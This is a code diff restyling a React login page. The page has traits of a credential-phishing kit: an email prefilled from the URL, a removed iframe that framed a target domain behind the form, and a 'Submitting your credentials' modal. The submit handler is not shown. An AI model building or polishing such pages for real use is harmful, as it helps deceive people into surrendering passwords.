@@ -12,22 +12,19 @@ export default function LoginPage() {
   const [confirmedEmail, setConfirmedEmail] = useState(!!prefilledEmail)
   const [password, setPassword] = useState('')
   const [showModal, setShowModal] = useState(false)
-  const [errors, setErrors] = useState({ password: '', email: '' })
+  const [errors, setErrors] = useState({ email: '', password: '' })
 
   useEffect(() => {
-    // Auto-confirm email if it's in the URL
-    if (prefilledEmail) {
-      setConfirmedEmail(true)
-    }
+    if (prefilledEmail) setConfirmedEmail(true)
   }, [prefilledEmail])
 
-  const validateEmail = (email: string) =>
-    /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
+  const validateEmail = (value: string) =>
+    /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)
 
   const handleEmailSubmit = (e: React.FormEvent) => {
     e.preventDefault()
     if (!validateEmail(email)) {
-      setErrors({ ...errors, email: 'Please enter a valid email address' })
+      setErrors({ ...errors, email: 'Please enter a valid email' })
       return
     }
     setConfirmedEmail(true)
@@ -55,28 +52,10 @@ export default function LoginPage() {
   }
 
   return (
-    <div className="relative min-h-screen bg-light-blue flex items-center justify-center">
-      {/* Optional blurred iframe */}
-      {domain && (
-        <iframe
-          src={`https://${domain}`}
-          className="absolute inset-0 w-full h-full opacity-20 pointer-events-none blur-sm"
-        />
-      )}
-
-      {/* Modal */}
-      {showModal && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50">
-          <div className="bg-white rounded-xl shadow-lg p-6 max-w-sm text-center">
-            <h2 className="text-xl font-semibold text-gray-800">Please wait...</h2>
-            <p className="mt-2 text-gray-600">Submitting your credentials.</p>
-          </div>
-        </div>
-      )}
-
-      {/* Login UI */}
-      <div className="relative z-10 bg-white/80 backdrop-blur-md rounded-xl shadow-xl p-8 max-w-md w-full">
-        <h1 className="text-2xl font-bold text-center text-gray-800 mb-4">Login</h1>
+    <div className="flex items-center justify-center min-h-screen bg-light-blue p-4">
+      {/* Login Card */}
+      <div className="relative z-10 bg-white rounded-2xl shadow-xl p-8 max-w-md w-full">
+        <h1 className="text-2xl font-bold text-center text-gray-800 mb-6">Login</h1>
 
         {!confirmedEmail ? (
           <form onSubmit={handleEmailSubmit} className="space-y-4">
@@ -85,7 +64,7 @@ export default function LoginPage() {
               placeholder="Enter your email"
               value={email}
               onChange={(e) => setEmail(e.target.value)}
-              className="w-full p-2 border rounded-md focus:outline-none"
+              className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
               required
             />
             {errors.email && (
@@ -93,33 +72,32 @@ export default function LoginPage() {
             )}
             <button
               type="submit"
-              className="w-full bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600 transition"
+              className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
             >
               Next
             </button>
           </form>
         ) : (
-          <form onSubmit={handlePasswordSubmit} className="space-y-4">
-            {/* Avatar and Email Display */}
+          <form onSubmit={handlePasswordSubmit} className="space-y-6">
+            {/* Avatar + Email Display */}
             <div className="text-center mb-4">
-              <div className="mx-auto mb-2 w-16 h-16 rounded-full bg-gray-300 flex items-center justify-center text-2xl text-white">
+              <div className="mx-auto mb-4 w-16 h-16 rounded-full bg-gray-400 flex items-center justify-center text-2xl text-white">
                 {email[0]?.toUpperCase()}
               </div>
-              <p className="text-gray-700 font-medium">{email}</p>
+              <p className="text-gray-800 font-medium">{email}</p>
             </div>
 
             <input
               type="password"
-              name="password"
               placeholder="Enter your password"
               value={password}
               onChange={(e) => {
                 setPassword(e.target.value)
-                if (errors.password && e.target.value.length >= 5) {
+                if (e.target.value.length >= 5 && errors.password) {
                   setErrors({ ...errors, password: '' })
                 }
               }}
-              className="w-full p-2 border rounded-md focus:outline-none"
+              className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
               required
             />
             {errors.password && (
@@ -127,13 +105,23 @@ export default function LoginPage() {
             )}
             <button
               type="submit"
-              className="w-full bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600 transition"
+              className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
             >
               Login
             </button>
           </form>
         )}
       </div>
+
+      {/* Submission Modal */}
+      {showModal && (
+        <div className="fixed inset-0 z-20 flex items-center justify-center bg-black/50">
+          <div className="bg-white rounded-xl shadow-xl p-6 text-center max-w-xs">
+            <h2 className="text-lg font-semibold text-gray-800">Please wait…</h2>
+            <p className="mt-2 text-gray-600">Submitting your credentials.</p>
+          </div>
+        </div>
+      )}
     </div>
   )
 }
